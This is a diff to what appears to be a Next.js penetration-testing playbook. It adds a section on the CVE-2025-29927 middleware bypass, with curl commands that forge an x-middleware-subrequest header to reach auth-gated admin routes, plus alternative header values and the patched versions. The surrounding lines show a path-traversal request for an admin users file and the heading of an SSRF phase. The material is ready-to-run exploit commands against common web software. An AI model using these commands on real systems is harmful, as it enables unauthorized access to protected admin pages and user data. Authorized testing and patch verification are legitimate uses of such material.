@@ -97,6 +97,15 @@ curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
 
 ---
 
+### Middleware bypass via `x-middleware-subrequest` (CVE-2025-29927)
+Next skips middleware execution entirely when this header asserts an internal subrequest — bypassing auth/redirect middleware on gated routes.
+```bash
+curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard \
+  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
+# also: -H "x-middleware-subrequest: src/middleware"  and  "pages/_middleware"
+# 200 on a middleware-gated route = bypassed. Fixed 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3.
+```
+
 ## Phase 4 — Image Optimization SSRF (`/_next/image`)
 
 ```bash
